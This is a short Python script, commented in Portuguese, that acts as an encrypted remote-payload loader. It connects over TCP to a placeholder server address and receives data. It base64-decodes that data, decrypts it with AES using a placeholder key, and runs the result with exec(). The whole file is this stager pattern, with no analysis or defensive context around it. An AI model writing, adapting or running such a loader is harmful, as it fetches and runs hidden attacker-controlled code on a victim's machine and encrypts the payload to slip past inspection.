from Crypto.Cipher import AES							
from base64 import b64decode
import socket
import os

# Criando AES
aes = AES.new('CHAVE SECRETA', AES.MODE_ECB)

# Contactando o servidor
cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
cliente.connect(('ENDERECO IP DO SERVIDOR', 12345))

# Recebendo payload
payload = cliente.recv(1024)

if payload:

	# Executando payload
	exec(aes.decrypt(b64decode(payload)).rstrip('@'))		

# Fechando servidor TCP
cliente.close()




